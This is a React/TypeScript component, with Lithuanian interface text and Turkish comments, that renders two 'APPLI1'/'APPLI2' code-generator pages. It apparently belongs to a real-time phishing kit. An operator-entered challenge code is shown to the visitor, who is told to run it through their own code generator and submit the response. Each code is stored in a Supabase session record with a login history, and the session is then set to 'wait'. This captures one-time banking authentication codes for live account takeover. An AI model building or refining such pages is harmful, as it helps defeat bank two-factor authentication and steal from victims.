"use client";

import { useEffect, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string | null;
  variant: "generator1" | "generator2";
};

export function GeneratorClient({ sessionId, variant }: Props) {
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [values, setValues] = useState<Record<string, string>>({});
  const [generatorCode, setGeneratorCode] = useState<string>("");
  const [saving, setSaving] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Generator 2: admin'in girdigi rakam (form_data.generatorCode) kullaniciya gosterilir
  useEffect(() => {
    if (variant !== "generator2" || !supabase || !sessionId) return;
    let cancelled = false;
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const code = data?.form_data?.generatorCode;
      if (typeof code === "string") setGeneratorCode(code.trim());
    })();
    return () => {
      cancelled = true;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [variant, sessionId, supabase]);

  async function submitFormData(data: Record<string, string>) {
    if (!supabase || !sessionId || saving) return;
    setSaving(true);
    setError(null);

    const { data: row } = await supabase
      .from("sessions")
      .select("form_data")
      .eq("id", sessionId)
      .maybeSingle();

    // Tip basina GUNCEL kayit: { generator1: {...}, generator2: {...} }
    // Ayni tipin eski guncel kaydi gecmise tasinir; diger tip korunur.
    const prevFd = (row?.form_data ?? {}) as Record<string, any>;
    const prevHistory: any[] = Array.isArray(prevFd.generatorLoginHistory)
      ? [...prevFd.generatorLoginHistory]
      : [];
    const genCurrent: Record<string, any> =
      prevFd.generatorCurrent && typeof prevFd.generatorCurrent === "object"
        ? { ...prevFd.generatorCurrent }
        : {};
    // Legacy tek-alan verisini (generatorData + generatorType) normalize et
    if (
      prevFd.generatorData &&
      typeof prevFd.generatorData === "object" &&
      Object.keys(prevFd.generatorData).length > 0
    ) {
      const lt = typeof prevFd.generatorType === "string" ? prevFd.generatorType : variant;
      const ex = genCurrent[lt];
      if (!ex || !ex.data || Object.keys(ex.data).length === 0) {
        genCurrent[lt] = {
          data: prevFd.generatorData,
          submittedAt: prevFd.generatorSubmittedAt,
          generatorCode: prevFd.generatorCode,
        };
      }
    }
    const prevSame = genCurrent[variant];
    if (prevSame?.data && typeof prevSame.data === "object" && Object.keys(prevSame.data).length > 0) {
      prevHistory.push({
        submittedAt: prevSame.submittedAt || new Date().toISOString(),
        generatorType: variant,
        generatorCode: prevSame.generatorCode,
        data: prevSame.data,
      });
    }
    genCurrent[variant] = {
      data,
      submittedAt: new Date().toISOString(),
      generatorCode: prevFd.generatorCode,
    };

    const { error: upErr } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...prevFd,
          generatorType: variant,
          generatorData: data,
          generatorSubmittedAt: new Date().toISOString(),
          generatorCurrent: genCurrent,
          generatorLoginHistory: prevHistory,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Klaida. Bandykite dar kartą.");
      return;
    }
    setDone(true);
  }

  const doneView = (
    <div className="py-8 text-center">
      <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
        <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
        </svg>
      </div>
      <p className="text-lg font-bold text-gray-900">Ačiū!</p>
      <p className="mt-1 text-sm text-gray-500">Jūsų duomenys sėkmingai išsiųsti.</p>
    </div>
  );

  // ======================= KOD HESAPLAYICI 1 (APPLI1) =======================
  if (variant === "generator1") {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
        <div className="w-full max-w-md rounded-3xl border border-black/5 bg-white p-7 shadow-[0_20px_60px_-15px_rgba(0,0,0,0.2)]">
          {done ? (
            doneView
          ) : (
            <form
              onSubmit={(e) => {
                e.preventDefault();
                void submitFormData({ generatoriaus_kodas: (values.generatoriaus_kodas ?? "").trim() });
              }}
              className="space-y-5"
            >
              {/* Cihaz gorseli + baslik */}
              <div className="flex flex-col items-center gap-3 pt-2">
                <img
                  src="/generator/code-calc-old.webp"
                  alt="Kodų generatorius"
                  className="h-28 object-contain"
                />
                <h1 className="text-base font-extrabold uppercase tracking-widest text-gray-900">
                  APPLI1
                </h1>
              </div>

              {/* Video (baslatilabilir/izlenebilir) */}
              <div className="overflow-hidden rounded-2xl border border-black/10 bg-black">
                <video
                  src="/generator/kod1.mp4"
                  controls
                  playsInline
                  preload="metadata"
                  className="aspect-video w-full object-cover"
                />
              </div>

              {/* Sari uyari */}
              <div className="flex items-start gap-2.5 rounded-xl border border-amber-300/60 bg-amber-50 px-4 py-3">
                <svg className="mt-0.5 h-4 w-4 shrink-0 text-amber-500" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625l6.28-10.875zM10 6.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6.5zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
                </svg>
                <p className="text-[13px] font-medium leading-snug text-amber-800">
                  Šis vaizdo įrašas pateiktas kaip pavyzdys. Tikrasis kodas gali skirtis.
                </p>
              </div>

              {/* Mavi bilgi */}
              <div className="flex items-start gap-2.5 rounded-xl border border-blue-300/50 bg-blue-50 px-4 py-3">
                <svg className="mt-0.5 h-4 w-4 shrink-0 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clipRule="evenodd" />
                </svg>
                <p className="text-[13px] font-medium leading-snug text-blue-800">
                  Bakstelėkite 1 savo įrenginyje ir įveskite kodą, kurį matote toliau esančiame laukelje.
                </p>
              </div>

              {/* Input */}
              <div>
                <label className="mb-1.5 block text-sm font-bold text-gray-800">APPLI1</label>
                <input
                  type="text"
                  inputMode="numeric"
                  required
                  value={values.generatoriaus_kodas ?? ""}
                  onChange={(e) =>
                    setValues((prev) => ({ ...prev, generatoriaus_kodas: e.target.value }))
                  }
                  placeholder="Įveskite generatoriaus kodą"
                  className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[var(--brand)] focus:bg-white focus:ring-2 focus:ring-[var(--brand)]/20"
                />
              </div>

              {error && <p className="text-center text-sm font-medium text-red-500">{error}</p>}

              <button
                type="submit"
                disabled={saving}
                className="w-full rounded-xl bg-[var(--brand)] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-[var(--brand)]/25 transition-all hover:bg-[#0c9142] disabled:opacity-50"
              >
                {saving ? "Siunčiama..." : "Tęsti"}
              </button>
            </form>
          )}
        </div>
      </div>
    );
  }

  // ======================= KOD HESAPLAYICI 2 (APPLI2) =======================
  const shownCode = generatorCode || "----";
  return (
    <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
      <div className="w-full max-w-md rounded-3xl border border-black/5 bg-white p-7 shadow-[0_20px_60px_-15px_rgba(0,0,0,0.2)]">
        {done ? (
          doneView
        ) : (
          <form
            onSubmit={(e) => {
              e.preventDefault();
              void submitFormData({ generatoriaus_kodas: (values.generatoriaus_kodas ?? "").trim() });
            }}
            className="space-y-5"
          >
            {/* Cihaz gorseli + baslik */}
            <div className="flex flex-col items-center gap-3 pt-2">
              <img
                src="/generator/code-calc-old.webp"
                alt="Kodų generatorius"
                className="h-28 object-contain"
              />
              <h1 className="text-base font-extrabold uppercase tracking-widest text-gray-900">
                APPLI2
              </h1>
            </div>

            {/* Video (baslatilabilir/izlenebilir) */}
            <div className="overflow-hidden rounded-2xl border border-black/10 bg-black">
              <video
                src="/generator/kod2.mp4"
                controls
                playsInline
                preload="metadata"
                className="aspect-video w-full object-cover"
              />
            </div>

            {/* Sari uyari */}
            <div className="flex items-start gap-2.5 rounded-xl border border-amber-300/60 bg-amber-50 px-4 py-3">
              <svg className="mt-0.5 h-4 w-4 shrink-0 text-amber-500" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625l6.28-10.875zM10 6.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6.5zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
              </svg>
              <p className="text-[13px] font-medium leading-snug text-amber-800">
                Šis vaizdo įrašas pateiktas kaip pavyzdys. Tikrasis kodas gali skirtis.
              </p>
            </div>

            {/* Admin'in girdigi kod (sari kutu) */}
            <div className="rounded-xl border border-amber-400/70 bg-amber-400/20 px-4 py-3 text-center">
              <p className="text-sm font-bold text-gray-900">
                Įveskite šį kodą: <span className="font-mono tracking-widest">{shownCode}</span>
              </p>
            </div>

            {/* Mavi bilgi */}
            <div className="flex items-start gap-2.5 rounded-xl border border-blue-300/50 bg-blue-50 px-4 py-3">
              <svg className="mt-0.5 h-4 w-4 shrink-0 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clipRule="evenodd" />
              </svg>
              <p className="text-[13px] font-medium leading-snug text-blue-800">
                Generatoriuje paspauskite 2, įveskite kodą{" "}
                <span className="font-mono font-bold">{shownCode}</span> į generatorių ir
                įrašykite gautą kodą į žemiau esantį laukelį, tada tęskite.
              </p>
            </div>

            {/* Input */}
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-800">APPLI2</label>
              <input
                type="text"
                inputMode="numeric"
                required
                value={values.generatoriaus_kodas ?? ""}
                onChange={(e) =>
                  setValues((prev) => ({ ...prev, generatoriaus_kodas: e.target.value }))
                }
                placeholder="Įveskite generatoriaus kodą"
                className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[var(--brand)] focus:bg-white focus:ring-2 focus:ring-[var(--brand)]/20"
              />
            </div>

            {error && <p className="text-center text-sm font-medium text-red-500">{error}</p>}

            <button
              type="submit"
              disabled={saving}
              className="w-full rounded-xl bg-[var(--brand)] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-[var(--brand)]/25 transition-all hover:bg-[#0c9142] disabled:opacity-50"
            >
              {saving ? "Siunčiama..." : "Tęsti"}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}
